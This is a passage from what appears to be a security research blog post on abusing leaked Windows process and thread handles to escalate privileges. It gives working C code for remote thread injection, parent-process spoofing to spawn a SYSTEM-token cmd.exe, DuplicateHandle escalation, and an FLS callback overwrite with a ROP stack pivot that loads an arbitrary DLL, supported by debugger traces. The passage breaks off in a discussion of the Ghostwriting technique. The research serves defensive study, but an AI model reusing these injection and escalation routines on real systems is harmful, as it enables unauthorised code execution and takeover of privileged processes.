<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>void ProcessHandles()
</span><span class='line'>{
</span><span class='line'>    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
</span><span class='line'>    _NtQuerySystemInformation NtQuerySystemInformation =
</span><span class='line'>        (_NtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
</span><span class='line'>    _NtDuplicateObject NtDuplicateObject =
</span><span class='line'>        (_NtDuplicateObject)GetProcAddress(hNtdll, "NtDuplicateObject");
</span><span class='line'>    _NtQueryObject NtQueryObject =
</span><span class='line'>        (_NtQueryObject)GetProcAddress(hNtdll, "NtQueryObject");
</span><span class='line'>    _RtlEqualUnicodeString RtlEqualUnicodeString =
</span><span class='line'>        (_RtlEqualUnicodeString)GetProcAddress(hNtdll, "RtlEqualUnicodeString");
</span><span class='line'>    _RtlInitUnicodeString RtlInitUnicodeString = 
</span><span class='line'>        (_RtlInitUnicodeString)GetProcAddress(hNtdll, "RtlInitUnicodeString");
</span><span class='line'>
</span><span class='line'>    ULONG handleInfoSize = 0x10000;
</span><span class='line'>    NTSTATUS status;
</span><span class='line'>    PSYSTEM_HANDLE_INFORMATION phHandleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);
</span><span class='line'>    DWORD dwPid = GetCurrentProcessId();
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>    printf("[+] Looking for process handles...\n");
</span><span class='line'>
</span><span class='line'>    while ((status = NtQuerySystemInformation(
</span><span class='line'>        SystemHandleInformation,
</span><span class='line'>        phHandleInfo,
</span><span class='line'>        handleInfoSize,
</span><span class='line'>        NULL
</span><span class='line'>    )) == STATUS_INFO_LENGTH_MISMATCH)
</span><span class='line'>        phHandleInfo = (PSYSTEM_HANDLE_INFORMATION)realloc(phHandleInfo, handleInfoSize *= 2);
</span><span class='line'>
</span><span class='line'>    if (status != STATUS_SUCCESS)
</span><span class='line'>    {
</span><span class='line'>        printf("NtQuerySystemInformation failed!\n");
</span><span class='line'>        return;
</span><span class='line'>    }
</span><span class='line'>
</span><span class='line'>    printf("[+] Fetched %d handles\n", phHandleInfo-&gt;HandleCount);
</span><span class='line'>
</span><span class='line'>    // iterate handles until we find the privileged process
</span><span class='line'>    for (int i = 0; i &lt; phHandleInfo-&gt;HandleCount; ++i)
</span><span class='line'>    {
</span><span class='line'>        SYSTEM_HANDLE handle = phHandleInfo-&gt;Handles[i];
</span><span class='line'>        POBJECT_TYPE_INFORMATION objectTypeInfo;
</span><span class='line'>        PVOID objectNameInfo;
</span><span class='line'>        UNICODE_STRING objectName;
</span><span class='line'>        ULONG returnLength;
</span><span class='line'>
</span><span class='line'>        // Check if this handle belongs to the PID the user specified
</span><span class='line'>        if (handle.ProcessId != dwPid)
</span><span class='line'>            continue;
</span><span class='line'>
</span><span class='line'>        objectTypeInfo = (POBJECT_TYPE_INFORMATION)malloc(0x1000);
</span><span class='line'>        if (NtQueryObject(
</span><span class='line'>            (HANDLE)handle.Handle,
</span><span class='line'>            ObjectTypeInformation,
</span><span class='line'>            objectTypeInfo,
</span><span class='line'>            0x1000,
</span><span class='line'>            NULL
</span><span class='line'>        ) != STATUS_SUCCESS)
</span><span class='line'>            continue;
</span><span class='line'>
</span><span class='line'>        if (handle.GrantedAccess == 0x0012019f)
</span><span class='line'>        {
</span><span class='line'>            free(objectTypeInfo);
</span><span class='line'>            continue;
</span><span class='line'>        }
</span><span class='line'>
</span><span class='line'>        objectNameInfo = malloc(0x1000);
</span><span class='line'>        if (NtQueryObject(
</span><span class='line'>            (HANDLE)handle.Handle,
</span><span class='line'>            ObjectNameInformation,
</span><span class='line'>            objectNameInfo,
</span><span class='line'>            0x1000,
</span><span class='line'>            &returnLength
</span><span class='line'>        ) != STATUS_SUCCESS)
</span><span class='line'>        {
</span><span class='line'>            objectNameInfo = realloc(objectNameInfo, returnLength);
</span><span class='line'>            if (NtQueryObject(
</span><span class='line'>                (HANDLE)handle.Handle,
</span><span class='line'>                ObjectNameInformation,
</span><span class='line'>                objectNameInfo,
</span><span class='line'>                returnLength,
</span><span class='line'>                NULL
</span><span class='line'>            ) != STATUS_SUCCESS)
</span><span class='line'>            {
</span><span class='line'>                free(objectTypeInfo);
</span><span class='line'>                free(objectNameInfo);
</span><span class='line'>                continue;
</span><span class='line'>            }
</span><span class='line'>        }
</span><span class='line'>
</span><span class='line'>        // check if we've got a process object; there should only be one, but should we 
</span><span class='line'>        // have multiple, this is where we'd perform the checks
</span><span class='line'>        objectName = *(PUNICODE_STRING)objectNameInfo;
</span><span class='line'>        UNICODE_STRING pProcess, pThread;
</span><span class='line'>
</span><span class='line'>        RtlInitUnicodeString(&pThread, L"Thread");
</span><span class='line'>        RtlInitUnicodeString(&pProcess, L"Process");
</span><span class='line'>        if (RtlEqualUnicodeString(&objectTypeInfo-&gt;Name, &pProcess, TRUE) && TARGET == 0) {
</span><span class='line'>            printf("[+] Found process handle (%x)\n", handle.Handle);
</span><span class='line'>            HANDLE hProcess = (HANDLE)handle.Handle;
</span><span class='line'>        }
</span><span class='line'>        else if (RtlEqualUnicodeString(&objectTypeInfo-&gt;Name, &pThread, TRUE) && TARGET == 1) {
</span><span class='line'>            printf("[+] Found thread handle (%x)\n", handle.Handle);
</span><span class='line'>            HANDLE hThread = (HANDLE)handle.Handle;
</span><span class='line'>        else
</span><span class='line'>            continue;
</span><span class='line'>        
</span><span class='line'>        free(objectTypeInfo);
</span><span class='line'>        free(objectNameInfo);
</span><span class='line'>    }
</span><span class='line'>} </span></code></pre></td></tr></table></div></figure>


<p>We&rsquo;re essentially just fetching all system handles, filtering down to ones
belonging to our process, then hunting for a thread or a process. In a more
active client process with many threads or process handles we&rsquo;d need to filter
down further, but this is sufficient for testing.</p>

<p>The remainder of this post will be broken down into process and thread security
access rights.</p>

<h2>Process</h2>

<p>There are approximately 14 process-specific rights[3]. We&rsquo;re going to ignore
the standard object access rights for now (DELETE, READ_CONTROL, etc.) as they
apply more to the handle itself than what it allows one to do.</p>

<p>Right off the bat, we&rsquo;re going to dismiss the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PROCESS_QUERY_INFORMATION
</span><span class='line'>PROCESS_QUERY_LIMITED_INFORMATION
</span><span class='line'>PROCESS_SUSPEND_RESUME
</span><span class='line'>PROCESS_TERMINATE
</span><span class='line'>PROCESS_SET_QUOTA
</span><span class='line'>PROCESS_VM_OPERATION
</span><span class='line'>PROCESS_VM_READ
</span><span class='line'>SYNCHRONIZE</span></code></pre></td></tr></table></div></figure>


<p>To be clear I&rsquo;m only suggesting that the above access rights cannot be
exploited on their own; they are, of course, very useful when roped in with
others. There may be weird edge cases in which one of these might be useful
(PROCESS_TERMINATE, for example), but barring any magic, I don&rsquo;t see how.</p>

<p>That leaves the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PROCESS_ALL_ACCESS
</span><span class='line'>PROCESS_CREATE_PROCESS
</span><span class='line'>PROCESS_CREATE_THREAD
</span><span class='line'>PROCESS_DUP_HANDLE
</span><span class='line'>PROCESS_SET_INFORMATION
</span><span class='line'>PROCESS_VM_WRITE</span></code></pre></td></tr></table></div></figure>


<p>We&rsquo;ll run through each of these individually.</p>

<h3>PROCESS_ALL_ACCESS</h3>

<p>The most obvious of them all, this one grants us access to it all. We can
simply allocate memory and create a thread to obtain code execution:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>char payload[] = "\xcc\xcc";
</span><span class='line'>LPVOID lpBuf = VirtualAllocEx(hProcess, NULL, 2, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
</span><span class='line'>WriteProcessMemory(hProcess, lpBuf, payload, 2, NULL);
</span><span class='line'>CreateRemoteThread(hProcess, NULL, 0, lpBuf, 0, 0, NULL);</span></code></pre></td></tr></table></div></figure>


<p>Nothing to it.</p>

<h3>PROCESS_CREATE_PROCESS</h3>

<p>This right is &ldquo;required to create a process&rdquo;, which is to say that we can spawn
child processes. To do this remotely, we just need to spawn a process and set
its parent to the privileged process we&rsquo;ve got a handle to. This will create
the new process and inherit its parent token which will hopefully be a SYSTEM
token.</p>

<p>Here&rsquo;s how we do that:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>STARTUPINFOEXA sinfo = { sizeof(sinfo) };
</span><span class='line'>PROCESS_INFORMATION pinfo;
</span><span class='line'>LPPROC_THREAD_ATTRIBUTE_LIST ptList = NULL;
</span><span class='line'>SIZE_T bytes;
</span><span class='line'>
</span><span class='line'>sinfo.StartupInfo.cb = sizeof(STARTUPINFOEXA);
</span><span class='line'>InitializeProcThreadAttributeList(NULL, 1, 0, &bytes);
</span><span class='line'>ptList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(bytes);
</span><span class='line'>InitializeProcThreadAttributeList(ptList, 1, 0, &bytes);
</span><span class='line'>
</span><span class='line'>UpdateProcThreadAttribute(ptList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hPrivProc, sizeof(HANDLE), NULL, NULL);
</span><span class='line'>sinfo.lpAttributeList = ptList;
</span><span class='line'>
</span><span class='line'>CreateProcessA("cmd.exe", (LPSTR)"cmd.exe /c calc.exe", 
</span><span class='line'>        NULL, NULL, TRUE, 
</span><span class='line'>        EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, 
</span><span class='line'>        &sinfo.StartupInfo, &pinfo);</span></code></pre></td></tr></table></div></figure>


<p>We should now have calc running with the privileged token. Obviously we&rsquo;d want
to replace that with something more useful!</p>

<h3>PROCESS_CREATE_THREAD</h3>

<p>Here we&rsquo;ve got the ability to use <code>CreateRemoteThread</code>, but can&rsquo;t control any
memory in the target process. There are of course ways we can influence memory
without direct write access, such as WNF, but we&rsquo;d still have no way of
resolving those addresses. As it turns out, however, we don&rsquo;t need the control.
<code>CreateRemoteThread</code> can be pointed at a function with a single argument, which
gives us quite a bit of control. <code>LoadLibraryA</code> and <code>WinExec</code> are both great
candidates for executing child processes or loading arbitrary code.</p>

<p>As example, there&rsquo;s an ANSI <code>cmd.exe</code> located in msvcrt.dll at offset 0x503b8.
We can pass this as an argument to <code>CreateRemoteThread</code> and trigger a <code>WinExec</code>
call to pop a shell:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>DWORD dwCmd = (GetModuleBaseAddress(GetCurrentProcessId(), L"msvcrt.dll") + 0x503b8);
</span><span class='line'>HANDLE hThread = CreateRemoteThread(hPrivProc, NULL, 0,
</span><span class='line'>                        (LPTHREAD_START_ROUTINE)WinExec, 
</span><span class='line'>                        (LPVOID)dwCmd, 
</span><span class='line'>                        0, NULL);</span></code></pre></td></tr></table></div></figure>


<p>We can do something similar for <code>LoadLibraryA</code>. This of course is predicated on
the system path containing a writable directory for our user.</p>

<h3>PROCESS_DUP_HANDLE</h3>

<p>Microsoft&rsquo;s own documentation on process security and access rights points to
this specifically as a sensitive right. Using it, we can simply duplicate our
process handle with <code>PROCESS_ALL_ACCESS</code>, allowing us full RW to its address
space. As per Ivan Fratric&rsquo;s JIT bug, it&rsquo;s as simple as this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>HANDLE hDup = INVALID_HANDLE_VALUE;
</span><span class='line'>DuplicateHandle(hPrivProc, GetCurrentProcess(), GetCurrentProcess(), &hDup, PROCESS_ALL_ACCESS, 0, 0)</span></code></pre></td></tr></table></div></figure>


<p>Now we can simply follow the WriteProcessMemory/CreateRemoteThread strategy for
executing arbitrary code.</p>

<h3>PROCESS_SET_INFORMATION</h3>

<p>Granting this permission allows one to execute <code>SetInformationProcess</code> in
addition to several fields in <code>NtSetInformationProcess</code>. The latter is far more
powerful, but many of the <code>PROCESSINFOCLASS</code> fields available are either read
only or require additional privileges to actually set (<code>SeDebugPrivilege</code> for
<code>ProcessExceptionPort</code> and <code>ProcessInstrumentationCallback</code>(win7) for
example). Process Hacker[15] maintains an up to date definition of this class
and its members.</p>

<p>Of the available flags, none were particularly interesting on their own. I
needed to add <code>PROCESS_VM_*</code> privileges in order to make any usable and at
that point we defeat the purpose.</p>

<h3>PROCESS_VM_*</h3>

<p>This covers the three flavors of VM access: WRITE/READ/OPERATION. The first two
should be self-explanatory and the third allows one to operate on the virtual
address space itself, such as changing page protections (VirtualProtectEx) or
allocating memory (VirtualAllocEx). I won&rsquo;t address each permutation of these
three, but I think it&rsquo;s reasonable to assume that <code>PROCESS_VM_WRITE</code> is a
necessary requirement. While <code>PROCESS_VM_OPERATION</code> allows us to crash the
remote process which could open up other flaws, it&rsquo;s not a generic nor elegant
approach. Ditto with <code>PROCESS_VM_READ</code>.</p>

<p><code>PROCESS_VM_WRITE</code> proved to be a challenge on its own, and I was unable to
come up with a generic solution. At first blush, the entire set of
Shatter-like injection strategies documented by Hexacorn[12] seem like
they&rsquo;d be perfect. They simply require the remote process to use windows,
clipboard registrations, etc. None of these are guaranteed, but chances are one
is bound to exist. Unfortunately for us, many of them restrict access across
sessions or scaling integrity levels. We can write into the remote process,
but we need some way to gain control over execution flow.</p>

<p>In addition to being unable to modify page permissions, we cannot read nor
map/allocate memory. There are plenty of ways we can leak memory from the
remote process without directly interfacing with it, however.</p>

<p>Using <code>NtQuerySystemInformation</code>, for example, we can enumerate all threads
inside a remote process regardless of its IL. This grants us a list of
<code>SYSTEM_EXTENDED_THREAD_INFORMATION</code> objects which contain, among other
things, the address of the TEB. <code>NtQueryInformationProcess</code> allows us to fetch
the remote process PEB address. This latter API requires the
<code>PROCESS_QUERY_INFORMATION</code> right, however, which ended up throwing a major
wrench in my plan. Because of this I&rsquo;m appending <code>PROCESS_QUERY_INFORMATION</code>
onto <code>PROCESS_VM_WRITE</code> which gives us the necessary components to pull this
off. If someone knows of a way to leak the address of a remote process PEB
without it, I&rsquo;d love to hear.</p>

<p>The approach I took was a bit loopy, but it ended up working reliably and
generically. If you&rsquo;ve read my previous post on fiber local storage (FLS)[13],
this is the research I was referring to. If you haven&rsquo;t, I recommend giving it
a brief read, but I&rsquo;ll regurgitate a bit of it here.</p>

<p>Briefly, we can abuse fibers and FLS to overwrite callbacks which are executed
&ldquo;&hellip;on fiber deletion, thread exit, and when an FLS index is freed&rdquo;. The
primary thread of a process will always setup a fiber, thus there will always
be a callback for us to overwrite (msvcrt!_freefls). Callbacks are stored in
the PEB (FlsCallback) and the fiber local storage in the TEB (FlsData). By
smashing the FlsCallback we can obtain control over execution flow when one of
the fiber actions are taken.</p>

<p>With only write access to the process, however, this becomes a bit convoluted.
We cannot allocate memory and so we need some known location to put the
payload. In addition, the FlsCallback and FlsData variables in PEB/TEB are
pointers and we&rsquo;re unable to read these.</p>

<p>Stashing the payload turned out to be pretty simple. Since we&rsquo;ve established
we can leak PEB/TEB addresses we already have two powerful primitives. After
looking over both structures, I found that thread local storage (TLS) happened
to provide us with enough room to store ROP gadgets and a thin payload. TLS is
embedded within the structure itself, so we can simply offset into the TEB
address (which we have). If you&rsquo;re unfamiliar with TLS, Skywing&rsquo;s write-ups are
fantastic and have aged well[14].</p>

<p>Gaining control over the callback was a little trickier. A pointer to a
<code>_FLS_CALLBACK_INFO</code> structure is stored in the PEB (FlsCallback) and is an
opaque structure. Since we can&rsquo;t actually read this pointer, we have no simple
way of overwriting the pointer. Or do we?</p>

<p>What I ended up doing is overwriting the FlsCallback pointer itself in the PEB,
essentially creating my own fake <code>_FLS_CALLBACK_INFO</code> structure in TLS. It&rsquo;s a
pretty simple structure and really only has one value of importance: the
callback pointer.</p>

<p>In addition, as per the FLS article, we also need to take control over ECX/RCX.
This will allow us to stack pivot and continue executing our ROP payload. This
requires that we update the <code>TEB-&gt;FlsData</code> entry which we also are unable to
do, since it&rsquo;s a pointer. Much like <code>FlsCallback</code>, though, I was able to just
overwrite this value and craft my own data structure, which also turned out to
be pretty simple. The TLS buffer ended up looking like this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>//
</span><span class='line'>// 0  ] 00000000 00000000 [STACK PIVOT] 00000000
</span><span class='line'>// 16 ] 00000000 00000000 [ECX VALUE] [NEW STACK PTR]
</span><span class='line'>// 32 ] 41414141 41414141 41414141 41414141 
</span><span class='line'>//</span></code></pre></td></tr></table></div></figure>


<p>There just so happens to be a perfect stack pivot gadget located in
<code>kernelbase!SwitchToFiberContext</code> (or <code>kernel32!SwitchToFiber</code> on Windows 7):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>7603c415 8ba1d8000000    mov     esp,dword ptr [ecx+0D8h]
</span><span class='line'>7603c41b c20400          ret     4</span></code></pre></td></tr></table></div></figure>


<p>Putting this all together, execution results in:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>eax=7603c415 ebx=7ffdf000 ecx=7ffded54 edx=00280bc9 esi=00000001 edi=7ffdee28
</span><span class='line'>eip=7603c415 esp=0019fd6c ebp=0019fd84 iopl=0         nv up ei pl nz na po nc
</span><span class='line'>cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
</span><span class='line'>kernel32!SwitchToFiber+0x115:
</span><span class='line'>7603c415 8ba1d8000000    mov     esp,dword ptr [ecx+0D8h]
</span><span class='line'>ds:0023:7ffdee2c=7ffdee30
</span><span class='line'>0:000&gt; p
</span><span class='line'>eax=7603c415 ebx=7ffdf000 ecx=7ffded54 edx=00280bc9 esi=00000001 edi=7ffdee28
</span><span class='line'>eip=7603c41b esp=7ffdee30 ebp=0019fd84 iopl=0         nv up ei pl nz na po nc
</span><span class='line'>cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
</span><span class='line'>kernel32!SwitchToFiber+0x11b:
</span><span class='line'>7603c41b c20400          ret     4
</span><span class='line'>0:000&gt; dd esp l3
</span><span class='line'>7ffdee30  41414141 41414141 41414141</span></code></pre></td></tr></table></div></figure>


<p>Now we&rsquo;ve got EIP and a stack pivot. Instead of marking memory and executing
some other payload, I took a quick and lazy strategy and simply called
<code>LoadLibraryA</code> to load a DLL off disk from an arbitrary location. This works
well, is reliable, and even on process exit will execute and block, depending
on what you do within the DLL. Here&rsquo;s the final code to achieve all this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>_NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll"), "NtWriteVirtualMemory");
</span><span class='line'>
</span><span class='line'>LPVOID lpBuf = malloc(13*sizeof(SIZE_T));
</span><span class='line'>HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE|PROCESS_QUERY_INFORMATION, FALSE, dwTargetPid);
</span><span class='line'>if (hProcess == NULL)
</span><span class='line'>    return;
</span><span class='line'>
</span><span class='line'>SIZE_T LoadLibA = (SIZE_T)LoadLibraryA;
</span><span class='line'>SIZE_T RemoteTeb = GetRemoteTeb(hProcess), TlsAddr = 0;
</span><span class='line'>TlsAddr = RemoteTeb + 0xe10;
</span><span class='line'>
</span><span class='line'>SIZE_T RemotePeb = GetRemotePeb(hProcess);
</span><span class='line'>SIZE_T PivotGadget = 0x7603c415;
</span><span class='line'>SIZE_T StackAddress = (TlsAddr + 28) - 0xd8;
</span><span class='line'>SIZE_T RtlExitThread = (SIZE_T)GetProcAddress(GetModuleHandleA("ntdll"), "RtlExitUserThread");
</span><span class='line'>SIZE_T LoadLibParam = (SIZE_T)TlsAddr + 48;
</span><span class='line'>
</span><span class='line'>//
</span><span class='line'>// construct our TlsSlots payload:
</span><span class='line'>// 0  ] 00000000 00000000 [STACK PIVOT] 00000000
</span><span class='line'>// 16 ] 00000000 00000000 [ECX VALUE] [NEW STACK PTR]
</span><span class='line'>// 32 ] [LOADLIB ADDR] 41414141 [RET ADDR] [LOADLIB ARG PTR]
</span><span class='line'>// 48 ] 41414141
</span><span class='line'>//
</span><span class='line'>
</span><span class='line'>memset(lpBuf, 0x0, 16);
</span><span class='line'>*((DWORD*)lpBuf + 2) = PivotGadget;
</span><span class='line'>*((DWORD*)lpBuf+ 4) = 0;
</span><span class='line'>*((DWORD*)lpBuf + 5) = 0;
</span><span class='line'>*((DWORD*)lpBuf + 6) = StackAddress;
</span><span class='line'>
</span><span class='line'>StackAddress = TlsAddr + 32;
</span><span class='line'>*((DWORD*)lpBuf + 7) = StackAddress;
</span><span class='line'>*((DWORD*)lpBuf + 8) = LoadLibA;
</span><span class='line'>*((DWORD*)lpBuf + 9) = 0x41414141; // junk
</span><span class='line'>*((DWORD*)lpBuf + 10) = RtlExitThread;
</span><span class='line'>*((DWORD*)lpBuf + 11) = (SIZE_T)TlsAddr + 48;
</span><span class='line'>*((DWORD*)lpBuf + 12) = 0x41414141; // DLL name (AAAA.dll)
</span><span class='line'>
</span><span class='line'>NtWriteVirtualMemory(hProcess, (PVOID)TlsAddr, lpBuf, (13 * sizeof(SIZE_T)), NULL);
</span><span class='line'>
</span><span class='line'>// update FlsCallback in PEB and FlsData in TEB
</span><span class='line'>StackAddress = TlsAddr + 12;
</span><span class='line'>NtWriteVirtualMemory(hProcess, (LPVOID)(RemoteTeb + 0xfb4), (PVOID)&StackAddress, sizeof(SIZE_T), NULL);
</span><span class='line'>NtWriteVirtualMemory(hProcess, (LPVOID)(RemotePeb + 0x20c), (PVOID)&TlsAddr, sizeof(SIZE_T), NULL);</span></code></pre></td></tr></table></div></figure>


<p>If all works well you should see attempts to load <code>AAAA.dll</code> off disk when the
callback is executed (just close the process). As a note, we&rsquo;re using
<code>NtWriteVirtualMemory</code> here because <code>WriteProcessMemory</code> requires
<code>PROCESS_VM_OPERATION</code> which we may not have.</p>

<p>Another variation of this access might be <code>PROCESS_VM_WRITE|PROCESS_VM_READ</code>.
This gives us visibility into the address space, but we still cannot allocate
or map memory into the remote process. Using the above strategy we can rid
ourselves of the <code>PROCESS_QUERY_INFORMATION</code> requirement and simply read the
PEB address out of TEB.</p>

<p>Finally, consider <code>PROCESS_VM_WRITE|PROCESS_VM_READ|PROCESS_VM_OPERATION</code>.
Granting us <code>PROCESS_VM_OPERATION</code> loosens the restrictions quite a bit, as we
can now allocate memory and change page permissions. This allows us to more
easily use the above strategy, but also perform inline and IAT hooks.</p>

<h2>Thread</h2>

<p>As with the process handles, there are a handful of access rights we can dismiss
immediately:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>SYNCHRONIZE
</span><span class='line'>THREAD_QUERY_INFORMATION
</span><span class='line'>THREAD_GET_CONTEXT
</span><span class='line'>THREAD_QUERY_LIMITED_INFORMATION
</span><span class='line'>THREAD_SUSPEND_RESUME
</span><span class='line'>THREAD_TERMINATE</span></code></pre></td></tr></table></div></figure>


<p>Which leaves the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>THREAD_ALL_ACCESS
</span><span class='line'>THREAD_DIRECT_IMPERSONATION
</span><span class='line'>THREAD_IMPERSONATE
</span><span class='line'>THREAD_SET_CONTEXT
</span><span class='line'>THREAD_SET_INFORMATION
</span><span class='line'>THREAD_SET_LIMITED_INFORMATION
</span><span class='line'>THREAD_SET_THREAD_TOKEN</span></code></pre></td></tr></table></div></figure>


<h3>THREAD_ALL_ACCESS</h3>

<p>There&rsquo;s quite a lot we can do with this, including everything described in the
following thread access rights sections. I personally find the
<code>THREAD_DIRECT_IMPERSONATION</code> strategy to be the easiest.</p>

<p>There is another option that is a bit more arcane, but equally viable. Note
that this thread access doesn&rsquo;t give us VM read/write privileges, so there&rsquo;s
no easy to way to &ldquo;write&rdquo; into a thread, since that doesn&rsquo;t really make sense.
What we do have, however, is a series of APIs that sort of grant us that:
<code>SetThreadContext</code>[4] and <code>GetThreadContext</code>[5]. About a decade ago a code
injection technique dubbed Ghostwriting[6] was released to little fanfare. In
it, the author describes a code injection strategy that does not require the
typical win32 API calls; there&rsquo;s no WriteProcessMemory, NtMapViewOfSection, or
even OpenProcess.</p>

<p>While the write-up is lacking in a few departments, it&rsquo;s quite a clever bit of
code. In short, the author abuses the <code>SetThreadContext</code>/<code>GetThreadContext</code>
calls in tandem with a set of specific assembly gadgets to write a payload,
dword by dword, onto the threads stack. Once written, they use
<code>NtProtectVirtualMemoryAddress</code> to mark the code RWX and redirect code flow to
their payload.</p>

<p>For their write gadget, they hunt for a pattern inside NTDLL:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>MOV [REG1], REG2
</span><span class='line'>RET</span></code></pre></td></tr></table></div></figure>


<p>They then locate a <code>JMP $</code>, or jump here, which will operate as an auto lock
and infinitely loop. Once we&rsquo;ve found our two gadgets, we suspend the thread.
